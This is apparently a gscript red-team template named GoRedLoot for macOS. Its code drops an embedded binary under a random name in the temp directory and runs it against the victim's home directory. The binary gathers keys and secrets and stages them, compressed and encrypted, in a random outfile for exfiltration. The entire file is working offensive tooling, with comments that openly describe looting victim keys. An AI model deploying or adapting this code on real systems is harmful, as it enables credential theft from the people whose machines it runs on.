// Example gscript template
// Title: GoRedLoot
// Author: ahhh
// Purpose: Gathers target keys from the victim and stages (compresses / encrypts) them for exfil
// Gscript version: 1.0.0
// ATT&CK: 
// Tactic: Late pirority to run toward the end, will compress and encrypt to a random outfile
// Uses: GoRedLoot to take search and stage: https://github.com/ahhh/GoRedLoot

//priority:200
//timeout:200

//go_import:os/user as user
//go_import:os as os

//import:/private/tmp/GoRedLoot.macho

function Deploy() {  
    console.log("Starting GoRedLoot");
    // Getting our asset
    var lootBin = GetAssetAsBytes("GoRedLoot.macho");
    if (lootBin[1] != null) {
        console.log("errors: "+lootBin[1].Error());
    }

    // Get user home directory
    var myUser = user.Current();
    console.log(myUser[0]);
    var searchDir = myUser[0].HomeDir+"/";

    // Getting a random name and dropping file
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaNumericString(6);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, lootBin[0]);
    console.log("dropped the GoRedLoot binary here: "+name);

    // Create random out file
    var outfile = G.rand.GetAlphaNumericString(5);
    var tempp = os.TempDir();
    outfile = tempp+"/"+outfile.toLowerCase();
      
    // Executing child proc
    var proc = G.exec.ExecuteCommandAsync(name, [searchDir, outfile]);
    if (proc[1] != null) {
        console.log("errors: "+proc[1].Error());
    } else {
        console.log("pid: "+proc[0].Process.Pid);
    }
    
    console.log("Done GoRedLoot");
    return true;
}